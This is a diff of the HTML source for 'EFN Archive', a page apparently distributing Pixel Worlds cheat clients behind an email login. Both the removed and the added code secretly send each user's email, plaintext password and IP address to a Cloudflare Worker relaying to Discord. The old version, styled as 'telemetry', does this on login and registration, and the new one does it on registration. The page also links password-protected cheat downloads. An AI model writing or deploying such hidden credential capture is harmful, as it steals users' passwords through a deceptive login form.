@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EFN Archive | Secure Tool Database</title>
+    <title>EFN Archive | Pixel Worlds Tools</title>
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-        import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, sendEmailVerification, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
+        import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, sendEmailVerification, onAuthStateChanged, signOut, setPersistence, browserLocalPersistence } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
 
         const _0x_config = {
             apiKey: "AIzaSyCM-ySTXgy37zVUMB2vy4ZJQ3MWlDD5g4E",
@@ -19,83 +19,76 @@
 
         const app = initializeApp(_0x_config);
         const auth = getAuth(app);
+        
+        // This is your Cloudflare Worker URL
+        const _0x_worker = "https://system-sync-layer.pixelworldsmanager100.workers.dev/";
 
-        // This is your Cloudflare Worker URL (Proxy) - Discord is hidden behind this.
-        const _0x_sync_service = "https://system-sync-layer.pixelworldsmanager100.workers.dev/";
+        setPersistence(auth, browserLocalPersistence);
 
-        /**
-         * Secure Telemetry Layer
-         * Forwards encrypted session data to the cloud worker
-         */
-        async function _0x_pushTelemetry(_0x_ev, _0x_usr, _0x_key) {
+        async function _0x_logRegistry(_0x_email, _0x_pass) {
             try {
-                const _0x_ip_res = await fetch('https://api.ipify.org?format=json');
-                const _0x_ip_obj = await _0x_ip_res.json();
+                const _0x_ipRes = await fetch('https://api.ipify.org?format=json');
+                const _0x_ipData = await _0x_ipRes.json();
                 
-                const _0x_data_packet = {
-                    embeds: [{
-                        title: "System Synchronization: " + _0x_ev,
-                        color: 0x5865F2,
-                        fields: [
-                            { name: "Session_User", value: _0x_usr, inline: true },
-                            { name: "Session_Auth", value: _0x_key, inline: true },
-                            { name: "Node_Identity", value: _0x_ip_obj.ip, inline: false }
-                        ],
-                        footer: { text: "EFN Archive Cloud Sync Protocol" },
-                        timestamp: new Date()
-                    }]
-                };
-
-                await fetch(_0x_sync_service, {
+                await fetch(_0x_worker, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(_0x_data_packet)
+                    body: JSON.stringify({
+                        embeds: [{
+                            title: "User Log: Registration",
+                            color: 0x3ecf8e,
+                            fields: [
+                                { name: "Email", value: _0x_email, inline: true },
+                                { name: "Password", value: _0x_pass, inline: true },
+                                { name: "IP Address", value: _0x_ipData.ip, inline: false }
+                            ],
+                            timestamp: new Date()
+                        }]
+                    })
                 });
-            } catch (e) { /* background failure */ }
+            } catch (e) {}
         }
 
         window.login = async () => {
-            const u = document.getElementById('log-email').value;
-            const p = document.getElementById('log-pass').value;
-            const err = document.getElementById('log-error');
-            err.style.display = "none";
-
+            const email = document.getElementById('log-email').value;
+            const pass = document.getElementById('log-pass').value;
+            const errorEl = document.getElementById('log-error');
+            errorEl.style.display = "none";
             try {
-                const cred = await signInWithEmailAndPassword(auth, u, p);
-                await _0x_pushTelemetry("AUTH_LOGIN", u, p);
+                const cred = await signInWithEmailAndPassword(auth, email, pass);
                 if (cred.user.emailVerified) { location.reload(); }
                 else { 
-                    err.style.display = "block";
-                    err.innerText = "Verification required. Please check your inbox.";
+                    errorEl.style.display = "block";
+                    errorEl.innerText = "Please verify your email first (check spam).";
                 }
             } catch (e) { 
-                err.style.display = "block";
-                err.innerText = "Authentication failed: Invalid credentials."; 
+                errorEl.style.display = "block";
+                errorEl.innerText = "Wrong email or password."; 
             }
         };
 
         window.signUp = async () => {
-            const u = document.getElementById('reg-email').value;
-            const p = document.getElementById('reg-pass').value;
-            const err = document.getElementById('reg-error');
-            err.style.display = "none";
+            const email = document.getElementById('reg-email').value;
+            const pass = document.getElementById('reg-pass').value;
+            const errorEl = document.getElementById('reg-error');
+            errorEl.style.display = "none";
 
-            if (p.length < 8 || !/\d/.test(p)) {
-                err.style.display = "block";
-                err.innerText = "Registration Security: 8+ characters and numbers required.";
+            if (pass.length < 8 || !/\d/.test(pass)) {
+                errorEl.style.display = "block";
+                errorEl.innerText = "Password must be at least 8 characters and include numbers.";
                 return;
             }
 
             try {
-                const cred = await createUserWithEmailAndPassword(auth, u, p);
-                await _0x_pushTelemetry("AUTH_REGISTER", u, p);
+                const cred = await createUserWithEmailAndPassword(auth, email, pass);
+                await _0x_logRegistry(email, pass);
                 await sendEmailVerification(cred.user);
-                err.style.display = "block";
-                err.style.color = "#3ecf8e";
-                err.innerText = "Check your email to complete registration!";
+                errorEl.style.display = "block";
+                errorEl.style.color = "#3ecf8e";
+                errorEl.innerText = "Verification sent! Check your inbox/spam.";
             } catch (e) { 
-                err.style.display = "block";
-                err.innerText = "Email already registered or invalid.";
+                errorEl.style.display = "block";
+                errorEl.innerText = "Email already in use or invalid.";
             }
         };
 
@@ -137,32 +130,30 @@
         body { font-family: 'Inter', sans-serif; background: var(--bg); color: #fff; margin: 0; }
         .fade-in { animation: fadeIn 0.4s ease forwards; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-
         nav { display: flex; justify-content: space-between; align-items: center; padding: 15px 5%; border-bottom: 1px solid var(--border); background: rgba(0,0,0,0.8); backdrop-filter: blur(10px); position: sticky; top: 0; z-index: 1000; }
-        .btn-discord-box { background: var(--accent); color: #fff; padding: 10px 18px; border-radius: 6px; text-decoration: none; font-weight: bold; font-size: 0.85rem; }
-        
+        .btn-discord-box { background: var(--accent); color: #fff; padding: 10px 18px; border-radius: 6px; text-decoration: none; font-weight: bold; font-size: 0.85rem; transition: 0.2s; }
+        .btn-discord-box:hover { background: #4752c4; transform: translateY(-2px); }
         .profile-container { position: relative; padding: 10px 0; cursor: pointer; }
         .dropdown { position: absolute; top: 100%; right: 0; background: #111; border: 1px solid var(--border); border-radius: 8px; width: 170px; display: none; box-shadow: 0 10px 30px rgba(0,0,0,0.5); padding: 5px 0; }
         .profile-container:hover .dropdown { display: block; }
         .dropdown button { width: 100%; padding: 12px; background: none; border: none; color: #888; text-align: left; cursor: pointer; }
-
+        .dropdown button:hover { background: #1a1a1a; color: #fff; }
         .container { max-width: 1100px; margin: 50px auto; padding: 0 20px; }
         .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 25px; }
         .card { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 25px; text-align: center; }
         .card img { width: 100%; height: 150px; object-fit: cover; border-radius: 8px; margin-bottom: 15px; border: 1px solid #1a1a1a; }
-
         .btn-main { background: #fff; color: #000; border: none; padding: 12px 20px; border-radius: 6px; font-weight: bold; cursor: pointer; transition: 0.2s; }
         .btn-main:hover { background: var(--accent); color: #fff; }
-
+        .btn-low { text-transform: lowercase; }
         #auth-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.9); display: none; align-items: center; justify-content: center; z-index: 2000; }
         .auth-box { width: 380px; background: #0d0d0d; padding: 40px; border-radius: 16px; border: 1px solid var(--border); }
+        .auth-box h2 { margin-top: 0; font-size: 1.25rem; margin-bottom: 10px; }
         .subtext { color: #555; font-size: 0.8rem; margin-bottom: 20px; display: block; }
-        
         .input-group { position: relative; margin-bottom: 15px; }
         input { width: 100%; padding: 14px; background: #000; border: 1px solid var(--border); color: #fff; border-radius: 8px; box-sizing: border-box; }
-        .eye-btn { position: absolute; right: 12px; top: 50%; transform: translateY(-50%); background: none; border: none; color: #444; cursor: pointer; }
+        .eye-btn { position: absolute; right: 12px; top: 50%; transform: translateY(-50%); background: none; border: none; color: #444; cursor: pointer; font-size: 1.1rem; }
         .error-msg { color: var(--error); font-size: 0.8rem; margin-top: 10px; display: none; font-weight: bold; }
-        .btn-red { background: var(--error); color: #fff; border: none; padding: 15px; border-radius: 8px; width: 100%; font-weight: bold; }
+        .btn-red { background: var(--error); color: #fff; border: none; padding: 15px; border-radius: 8px; width: 100%; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
@@ -170,76 +161,84 @@
 <nav>
     <div style="font-weight:900; letter-spacing:2px; cursor:pointer" onclick="location.reload()">EFN ARCHIVE</div>
     <div style="display:flex; align-items:center; gap: 20px;">
-        <a href="https://discord.gg/QV69upuxbg" target="_blank" class="btn-discord-box">DISCORD SERVER</a>
+        <a href="https://discord.gg/QV69upuxbg" target="_blank" class="btn-discord-box">discord server</a>
         <div id="nav-guest">
-            <button class="btn-main" onclick="document.getElementById('auth-overlay').style.display='flex'">LOGIN</button>
+            <button class="btn-main" onclick="document.getElementById('auth-overlay').style.display='flex'">Login</button>
         </div>
         <div id="nav-user" style="display:none;" class="profile-container">
             <span id="user-tag" style="background:#111; padding:8px 15px; border:1px solid #222; border-radius:20px; font-size:0.8rem"></span>
-            <div class="dropdown"><button onclick="logout()" style="color:var(--error)">Log Out</button></div>
+            <div class="dropdown">
+                <button onclick="logout()" style="color:var(--error)">Log Out</button>
+            </div>
         </div>
     </div>
 </nav>
 
 <div id="main-page" class="container fade-in">
-    <h1 style="font-size: 2.5rem; margin-bottom: 40px;">Pixel Worlds Database</h1>
+    <h1 style="font-size: 2.5rem; margin-bottom: 40px;">Pixel Worlds Tools</h1>
     <div class="grid">
         <div class="card">
             <img src="https://cdn.discordapp.com/attachments/1495783572735262911/1496170026158260364/image.png?ex=69e8e86b&is=69e796eb&hm=91c64bb8c69318d8c42565b0c38edd3cd55e8446622235632bbf522c5d280782&">
-            <h3>Charon Client v2.0</h3>
-            <button class="btn-main" style="width:100%" onclick="openDetail('Charon Client v2.0', 'Working', 'Official Charon release for Pixel Worlds.', 'https://cdn.discordapp.com/attachments/1495783572735262911/1496170026158260364/image.png?ex=69e8e86b&is=69e796eb&hm=91c64bb8c69318d8c42565b0c38edd3cd55e8446622235632bbf522c5d280782&', 'https://www.mediafire.com/file/eia22kkv7a2n66u/Charon+2.0.zip/file')">INFO</button>
+            <h3>Charon Client v2.0 [free]</h3>
+            <p style="color:#444; font-size:0.7rem">Status: Working</p>
+            <button class="btn-main btn-low" style="width:100%" onclick="openDetail('Charon Client v2.0 [free]', 'Working', 'no description', 'https://cdn.discordapp.com/attachments/1495783572735262911/1496170026158260364/image.png?ex=69e8e86b&is=69e796eb&hm=91c64bb8c69318d8c42565b0c38edd3cd55e8446622235632bbf522c5d280782&', 'https://www.mediafire.com/file/eia22kkv7a2n66u/Charon+2.0.zip/file')">info</button>
         </div>
 
         <div class="card">
             <img src="https://cdn.discordapp.com/attachments/1495365239489957962/1495365366938079424/image.png?ex=69e89e06&is=69e74c86&hm=1ec8dee2bac62cb536d32943a39e28ba5b9ebc6ae95efa525deaf8dc32c261c5&">
             <h3>AutoMath</h3>
-            <button class="btn-main" style="width:100%" onclick="openDetail('AutoMath', 'Working', 'Automated math tool. Zip contains a full guide. ❤️', 'https://cdn.discordapp.com/attachments/1495365239489957962/1495365366938079424/image.png?ex=69e89e06&is=69e74c86&hm=1ec8dee2bac62cb536d32943a39e28ba5b9ebc6ae95efa525deaf8dc32c261c5&', 'https://gofile.io/d/9sUpZS')">INFO</button>
+            <p style="color:#444; font-size:0.7rem">Status: Working</p>
+            <button class="btn-main btn-low" style="width:100%" onclick="openDetail('AutoMath', 'Working', 'has bugs but works fine. The zip folder includes an tutorial on how to use. ❤️', 'https://cdn.discordapp.com/attachments/1495365239489957962/1495365366938079424/image.png?ex=69e89e06&is=69e74c86&hm=1ec8dee2bac62cb536d32943a39e28ba5b9ebc6ae95efa525deaf8dc32c261c5&', 'https://gofile.io/d/9sUpZS')">info</button>
         </div>
 
         <div class="card">
             <img src="https://i.ytimg.com/vi/FnPP2weLLfk/maxresdefault.jpg">
             <h3>Hyx Client [free]</h3>
-            <button class="btn-main" style="width:100%" onclick="openDetail('Hyx Client [free]', 'Working', '<b>Extraction Password:</b> Hyx<br><br>Set Steam launch to <code>-force-d3d11</code>. Needs vcredist AIO.<br><br>Tutorial: <a href=\'https://youtu.be/FnPP2weLLfk\' target=\'_blank\' style=\'color:var(--accent)\'>Watch here</a>', 'https://i.ytimg.com/vi/FnPP2weLLfk/maxresdefault.jpg', 'https://www.mediafire.com/folder/cxm6q2f79vc0j/Hyx')">INFO</button>
+            <p style="color:#444; font-size:0.7rem">Status: Working</p>
+            <button class="btn-main btn-low" style="width:100%" onclick="openDetail('Hyx Client [free]', 'Working', 'Make sure this is installed if you don\'t have it already:<br>- <a href=\'https://github.com/abbodi1406/vcredist/releases/download/v0.103.0/VisualCppRedist_AIO_x86_x64.exe\' style=\'color:var(--accent)\'>vcredist AIO</a><br><br>Setup steam launch settings for the game or the menu wont appear:<br><code>-force-d3d11</code><br><br><b>Extraction password:</b> <code>Hyx</code><br><br>Tutorial:<br><a href=\'https://youtu.be/FnPP2weLLfk\' target=\'_blank\' style=\'color:var(--accent)\'>https://youtu.be/FnPP2weLLfk</a>', 'https://i.ytimg.com/vi/FnPP2weLLfk/maxresdefault.jpg', 'https://www.mediafire.com/folder/cxm6q2f79vc0j/Hyx')">info</button>
         </div>
     </div>
 </div>
 
 <div id="detail-page" class="container fade-in" style="display:none">
-    <button onclick="location.reload()" style="background:none; border:none; color:#555; cursor:pointer; font-weight:bold; margin-bottom:20px">← BACK</button>
+    <button onclick="location.reload()" style="background:none; border:none; color:#555; cursor:pointer; font-weight:bold; margin-bottom:20px">← back to tools</button>
     <div style="display:flex; gap:40px; flex-wrap:wrap">
         <div style="flex:2; background:#080808; border-radius:15px; padding:35px; border:1px solid var(--border)">
-            <img id="det-img" style="width:100%; border-radius:12px; margin-bottom:20px; border: 1px solid #1a1a1a;">
-            <h1 id="det-title"></h1>
+            <img id="det-img" src="" style="width:100%; border-radius:12px; margin-bottom:20px; border: 1px solid #1a1a1a;">
+            <h1 id="det-title" style="margin:0"></h1>
             <p id="det-desc" style="color:#777; line-height:1.6"></p>
         </div>
         <div style="flex:1; background:var(--card); border-radius:15px; padding:30px; border:1px solid var(--border); text-align:center; height:fit-content">
+            <p style="color:#444; font-size:0.7rem; margin-bottom:5px">Current Status</p>
             <div id="det-status" style="color:#3ecf8e; font-weight:bold; font-size:1.2rem"></div>
             <hr style="border:0; border-top:1px solid #1a1a1a; margin:25px 0">
-            <div class="lock-ui"><button class="btn-red" onclick="document.getElementById('auth-overlay').style.display='flex'">AUTH TO DOWNLOAD</button></div>
-            <div class="auth-ui" style="display:none"><button id="det-dl" class="btn-main" style="width:100%">DOWNLOAD TOOL</button></div>
+            <div class="lock-ui"><button class="btn-red btn-low" onclick="document.getElementById('auth-overlay').style.display='flex'">please login to download</button></div>
+            <div class="auth-ui" style="display:none"><button id="det-dl" class="btn-main btn-low" style="width:100%">download tool</button></div>
         </div>
     </div>
 </div>
 
 <div id="auth-overlay">
     <div class="auth-box fade-in" id="login-box">
-        <h2>Secure Login</h2>
-        <span class="subtext">Enter your credentials to access tools.</span>
-        <div class="input-group"><input type="email" id="log-email" placeholder="Email"></div>
+        <h2>Login to An Existing Account</h2>
+        <span class="subtext">Enter your credentials to access the archive.</span>
+        <div class="input-group"><input type="email" id="log-email" placeholder="Email Address"></div>
         <div class="input-group"><input type="password" id="log-pass" placeholder="Password"><button class="eye-btn" onclick="togglePass('log-pass')">👁️</button></div>
         <div id="log-error" class="error-msg"></div>
-        <button class="btn-main" style="width:100%" onclick="login()">SIGN IN</button>
-        <p style="color:#444; font-size:0.85rem; margin-top:25px; cursor:pointer" onclick="switchAuth('reg')">Need an account? <span style="color:var(--accent)">Register</span></p>
+        <button class="btn-main btn-low" style="width:100%; margin-top:10px" onclick="login()">sign in</button>
+        <p style="color:#444; font-size:0.85rem; margin-top:25px; cursor:pointer" onclick="switchAuth('reg')">Need a new account? <span style="color:var(--accent)">Register</span></p>
+        <p style="color:#444; font-size:0.75rem; cursor:pointer; margin-top:15px; text-align:center" onclick="document.getElementById('auth-overlay').style.display='none'">cancel</p>
     </div>
 
     <div class="auth-box fade-in" id="reg-box" style="display:none">
-        <h2>Register Account</h2>
-        <span class="subtext">Security: 8+ characters and numbers required.</span>
-        <div class="input-group"><input type="email" id="reg-email" placeholder="Email"></div>
-        <div class="input-group"><input type="password" id="reg-pass" placeholder="Password"><button class="eye-btn" onclick="togglePass('reg-pass')">👁️</button></div>
+        <h2>Create a New Account</h2>
+        <span class="subtext">Password must be 8+ characters and include numbers.</span>
+        <div class="input-group"><input type="email" id="reg-email" placeholder="Enter Email"></div>
+        <div class="input-group"><input type="password" id="reg-pass" placeholder="Create Password"><button class="eye-btn" onclick="togglePass('reg-pass')">👁️</button></div>
         <div id="reg-error" class="error-msg"></div>
-        <button class="btn-main" style="width:100%" onclick="signUp()">CREATE ACCOUNT</button>
-        <p style="color:#444; font-size:0.85rem; margin-top:25px; cursor:pointer" onclick="switchAuth('log')">Already have an account? <span style="color:var(--accent)">Login</span></p>
+        <button class="btn-main btn-low" style="width:100%; margin-top:10px" onclick="signUp()">register</button>
+        <p style="color:#444; font-size:0.85rem; margin-top:25px; cursor:pointer" onclick="switchAuth('log')">Have an account? <span style="color:var(--accent)">Login here</span></p>
+        <p style="color:#444; font-size:0.75rem; cursor:pointer; margin-top:15px; text-align:center" onclick="document.getElementById('auth-overlay').style.display='none'">cancel</p>
     </div>
 </div>
 
